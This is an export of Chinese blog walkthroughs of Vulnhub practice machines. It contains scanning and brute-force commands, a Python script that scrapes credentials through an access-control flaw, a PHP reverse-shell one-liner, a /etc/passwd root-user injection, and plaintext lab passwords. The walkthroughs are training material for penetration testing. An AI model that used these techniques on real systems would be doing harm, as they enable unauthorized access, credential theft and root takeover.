<h2 id="DOMDOM开始"><a href="#DOMDOM开始" class="headerlink" title="DOMDOM开始"></a>DOMDOM开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -T5 -A 192.168.56.106 -oA dom</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，爆破目录，指定扫描php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.106 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -t 100 -x php</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.56.106&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>4、发现命令执行漏洞，然后反弹shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926071603064.png" alt="image-20210926071603064"></p>
</blockquote>
<p>5、将linux-exploit-suggester.sh传上去检测漏洞，发现可以利用脏牛提权</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926071648751.png" alt="image-20210926071648751"></p>
</blockquote>
<p>也可以换种方法</p>
<p>查找特权工具</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926072806537.png" alt="image-20210926072806537"></p>
</blockquote>
<p>用tar获取domdom用户的home目录，然后可以发现root用户的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">tar -zcvf &#x2F;tmp&#x2F;dom.tar &#x2F;home&#x2F;domdom</span><br><span class="line">tar -zxvf dom.tar</span><br><span class="line"></span><br><span class="line">cat README.md</span><br><span class="line">Hi Dom, This is the root password:</span><br><span class="line"></span><br><span class="line">Mj7AGmPR-m&amp;Vf&gt;Ry&#123;&#125;LJRBS5nc+*V.#a</span><br></pre></td></tr></table></figure></div>

<p>直接su root登陆就行了</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机CONNECT THE DOTS</title>
    <url>/posts/152.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="CONNECT-THE-DOTS"><a href="#CONNECT-THE-DOTS" class="headerlink" title="CONNECT THE DOTS"></a>CONNECT THE DOTS</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul>
<li>级别：初级-中级</li>
<li>用户标志：user.txt</li>
<li>根标志：root.txt</li>
<li>描述：该机器与 VirtualBox 兼容，但也可以在 VMWare 中使用（未测试但应该可以使用）。DHCP 将自动分配 IP。您必须找到并读取分别存在于 user.txt 和 root.txt 中的两个标志（user 和 root）。尽情享受吧！</li>
</ul>
</blockquote>
<h2 id="CONNECT-THE-DOTS开始"><a href="#CONNECT-THE-DOTS开始" class="headerlink" title="CONNECT THE DOTS开始"></a>CONNECT THE DOTS开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况，发现有2049端口是nfs服务器</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -A 192.168.56.105</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，=我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.105&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt -t 200</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.56.104&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>4、用showmount查看挂在目录文件，然后挂在到当前目录的dots中，这里可以得到一个用户名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.56.105</span><br><span class="line">mount -t nfs 192.168.56.105:&#x2F;home&#x2F;morris dots</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925181543224.png" alt="image-20210925181543224"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925165654425.png" alt="image-20210925165654425"></p>
</blockquote>
<p>5、扫出的目录有一个register.html，发现里面有一个.cs的文件被加载，可以看到里面是jsfuck加密</p>
<p>我们在console中使用以下命令调用var中的b1-b10所有变量整合，然后解密</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">console.log(b1+b2+b3+b4+b5+b6+b7+b8+b9+b10)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925171415286.png" alt="image-20210925171415286"></p>
</blockquote>
<p>6、经典的爆破密码 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">login: norris   password: TryToGuessThisNorris@2k19</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925171742426.png" alt="image-20210925171742426"></p>
</blockquote>
<p>7、登陆，拿flag</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180031777.png" alt="image-20210925180031777"></p>
</blockquote>
<p>8、接着发现目录中有一个ftp文件，中有四个文件，我们用wget下载过来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python -m simplehttpserver  就会开启8000端口来让我们下载</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180157331.png" alt="image-20210925180157331"></p>
</blockquote>
<p>接着用exiftool查询game.jpg.bac图片信息，发现摩斯电码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180352991.png" alt="image-20210925180352991"></p>
</blockquote>
<p>然后解密得出，他在目录中放有一个公用的文件”SECRETFILE”里面有密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">HEY NORRIS, YOU&#39;VE MADE THIS FAR. FAR FAR FROM HEAVEN WANNA SEE HELL NOW? HAHA YOU SURELY MISSED ME, DIDN&#39;T YOU? OH DAMN MY BATTERY IS ABOUT TO DIE AND I AM UNABLE TO FIND MY CHARGER SO QUICKLY LEAVING A HINT IN HERE BEFORE THIS SYSTEM SHUTS DOWN AUTOMATICALLY. I AM SAVING THE GATEWAY TO MY DUNGEON IN A &#39;SECRETFILE&#39; WHICH IS PUBLICLY ACCESSIBLE.</span><br></pre></td></tr></table></figure></div>

<p>我们查询一下该文件的下路，发现在html文件中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -iname SECRETFILE 2&gt;&#x2F;dev&#x2F;null #不区分大小写查询</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180524382.png" alt="image-20210925180524382"></p>
</blockquote>
<p>通过测试得知，他估计电脑没电关机了，只有备份文件，但是其中有另一个用户的密码，通过下载文件swp备份</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180652537.png" alt="image-20210925180652537"></p>
</blockquote>
<p>获取其中的文本，得到morris的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">strings .secretfile.swp</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180801370.png" alt="image-20210925180801370"></p>
</blockquote>
<p>9、发现正常suid无法提权，我们查找特权工具，明显tar有可以无视权限的方式读取root的用户的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925180937058.png" alt="image-20210925180937058"></p>
</blockquote>
<p>但是发现只有norris的用户才能使用tar，所以可以利用tar的打包和解压方式获取root目录，将其解压进tmp目录，名为roottest.tar.gz</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925181145233.png" alt="image-20210925181145233"></p>
</blockquote>
<p>接着用tar来解压</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925181231124.png" alt="image-20210925181231124"></p>
</blockquote>
<p>就可以利用普通用户权限，读取root目录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925181256511.png" alt="image-20210925181256511"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机Me-and-My-Girlfriend-1</title>
    <url>/posts/150.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me-and-My-Girlfriend-1"></a>Me-and-My-Girlfriend-1</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>描述：这个虚拟机告诉我们有一对恋人，爱丽丝和鲍勃，这对夫妇原本非常浪漫，但自从爱丽丝在一家私人公司“Ceban Corp”工作后，爱丽丝对鲍勃的态度发生了一些变化是“隐藏的”，Bob 请求您帮助获取 Alice 隐藏的内容并获得对公司的完全访问权限！</p>
<p>难度级别：初学者</p>
<p>注意：有 2 个标志文件</p>
<p>学习：Web 应用程序 | 简单的提权</p>
<p><a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p>
</blockquote>
<h2 id="Me-and-My-Girlfriend-1开始"><a href="#Me-and-My-Girlfriend-1开始" class="headerlink" title="Me-and-My-Girlfriend-1开始"></a>Me-and-My-Girlfriend-1开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A 192.168.1.108</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.104&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt -t 200</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.104&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>4、进入主页，发下必须改x-forwarded-for为本地地址，所以下个插件改为127.0.0.1来访问</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925154409342.png" alt="image-20210925154409342"></p>
</blockquote>
<p>5、注册之后，发现有平行越权获取用户的账号和密码，写个脚本跑一波</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_UserInfo(id):</span><br><span class="line">    cookies &#x3D; &#123;</span><br><span class="line">            &quot;PHPSESSID&quot;:&quot;ve33ic8l6hhrn6004ul1binas3&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">            &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;93.0.4577.82 Safari&#x2F;537.36&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;192.168.56.104&#x2F;index.php?page&#x3D;profile&amp;user_id&#x3D;&#123;&#125;&quot;.format(id),headers&#x3D;headers,cookies&#x3D;cookies).text</span><br><span class="line"></span><br><span class="line">    name &#x3D; re.search(&quot;name\&quot; value&#x3D;\&quot;(.*?)\&quot;&gt;&quot;,res).group(1)</span><br><span class="line">    username &#x3D; re.search(&quot;rname\&quot; value&#x3D;\&quot;(.*?)\&quot;&gt;&quot;,res).group(1)</span><br><span class="line">    password &#x3D; re.search(&quot;word\&quot; value&#x3D;\&quot;(.*?)\&quot;&gt;&quot;,res).group(1)</span><br><span class="line">    return name,username,password</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    name,username,password &#x3D; get_UserInfo(i)</span><br><span class="line">    if name:</span><br><span class="line">        print(username+&quot;:&quot;+password)</span><br></pre></td></tr></table></figure></div>

<p>获取了密码</p>
<p>6、经典的爆破密码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925155049538.png" alt="image-20210925155049538"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">eweuhtandingan:skuyatuh</span><br><span class="line">aingmaung:qwerty!!!</span><br><span class="line">sundatea:indONEsia</span><br><span class="line">sedihaingmah:cedihhihihi</span><br><span class="line">alice:4lic3</span><br><span class="line">abdikasepak:dorrrrr</span><br><span class="line">gylq:gylq</span><br></pre></td></tr></table></figure></div>

<p>7、登陆，拿flag</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925155324774.png" alt="image-20210925155324774"></p>
</blockquote>
<p>8、简单提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sudo -l发现php是可以无密码使用root权限</span><br></pre></td></tr></table></figure></div>

<p>反弹root权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.56.1&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925160619686.png" alt="image-20210925160619686"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机GEARS OF WAR</title>
    <url>/posts/163.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="GEARS-OF-WAR"><a href="#GEARS-OF-WAR" class="headerlink" title="GEARS OF WAR"></a>GEARS OF WAR</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p><a href="https://www.vulnhub.com/entry/gears-of-war-ep1,382/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/gears-of-war-ep1,382/</a></p>
</blockquote>
<h2 id="GEARS-OF-WAR开始"><a href="#GEARS-OF-WAR开始" class="headerlink" title="GEARS OF WAR开始"></a>GEARS OF WAR开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A 192.168.1.108</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.104&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt -t 200</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.104&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>4、这题主要是搞445端口安全，就不管网站了，接着用get命令获取其中的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.56.103 -R</span><br><span class="line">smbclient &#x2F;&#x2F;192.168.56.103&#x2F;LOCUS_LAN$</span><br></pre></td></tr></table></figure></div>

<p>5、访问获取的文件，得到一个信息，让我们按照下面的字符解压缩包的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~&#x2F;BC&#x2F;war]</span><br><span class="line">└─# cat SOS.txt   </span><br><span class="line">This is a message for the Delta Team.</span><br><span class="line"></span><br><span class="line">I found a file that contains a password to free ........ oh no they here!!!!!!!!!!,</span><br><span class="line">i must protect myself, please try to get the password!!</span><br><span class="line"></span><br><span class="line">[@%%,]</span><br><span class="line"></span><br><span class="line">-Hoffman.</span><br></pre></td></tr></table></figure></div>

<p><strong>可以分析出来，这是用crunch来撞密码，他给出了特殊格式</strong>，用下面命令生成密码</p>
<blockquote>
<p><strong>1、@代表小写字母</strong></p>
<p><strong>2、%代表数字</strong></p>
<p><strong>3、逗号代表大写字符</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -t @%%, -o words</span><br></pre></td></tr></table></figure></div>

<p><strong>6、接着用fcrackzip破解密码 r44M</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -v -u msg_horda.zip -p words</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210924175840731.png" alt="image-20210924175840731"></p>
</blockquote>
<p>7、访问keys.txt获取</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~&#x2F;BC&#x2F;war]</span><br><span class="line">└─# cat key.txt                </span><br><span class="line">&quot;Vamos a atacar a los humanos con toda nuestras hordas,</span><br><span class="line">por eso puse en prision a el hombre mas peligroso que tenian,</span><br><span class="line">por lo que sin el son debiles.&quot;</span><br><span class="line"></span><br><span class="line">[[[[[[[[[[[[[[[[[[[[[&quot;3_d4y&quot;]]]]]]]]]]]]]]]]]]]]</span><br><span class="line"></span><br><span class="line">-General RAAM.</span><br></pre></td></tr></table></figure></div>

<p>8、通过我们前面用 enum4linux -r枚举出的用户，然后进行爆破登陆</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -p 3_d4y ssh:&#x2F;&#x2F;192.168.56.103</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210924181339481.png" alt="image-20210924181339481"></p>
</blockquote>
<p>直接ssh登陆</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ssh marcus@192.168.56.103 -t &quot;bash -noprofile&quot;</span><br></pre></td></tr></table></figure></div>

<p>9、提权，老方法了，suid，先搜索可用的suid文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;bin -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure></div>

<p>发现cp明显很可以用来覆盖/etc/passwd的文件来添加root的权限用户</p>
<p>①先用openssl生成一个用户加盐的真实密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt gylq 123456</span><br><span class="line"></span><br><span class="line">获得</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后将root用户的etc&#x2F;passwd的内容复制</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">将其中的x改为我们刚刚加盐的密码，并且将root改成gylq即用户名，就可以用我们创建的用户登录了</span><br><span class="line">gylq:$1$gylq$&#x2F;LTjhHmiHp0tpo66ocv2e&#x2F;:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210924204320539.png" alt="image-20210924204320539"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210924204418241.png" alt="image-20210924204418241"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机OS-HACKNOS-3</title>
    <url>/posts/149.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="OS-HACKNOS-3"><a href="#OS-HACKNOS-3" class="headerlink" title="OS-HACKNOS-3"></a>OS-HACKNOS-3</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul>
<li><p>难度：中级</p>
<p>Flag: 2 标记第一个用户和第二个根用户</p>
<p>学习：Web 应用程序 | 枚举 | 权限提升</p>
<p>网址：<a href="http://www.hacknos.com" target="_blank" rel="noopener">www.hacknos.com</a></p>
</li>
</ul>
<p><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/</a></p>
</blockquote>
<h2 id="OS-HACKNOS-3-1"><a href="#OS-HACKNOS-3-1" class="headerlink" title="OS-HACKNOS-3"></a>OS-HACKNOS-3</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
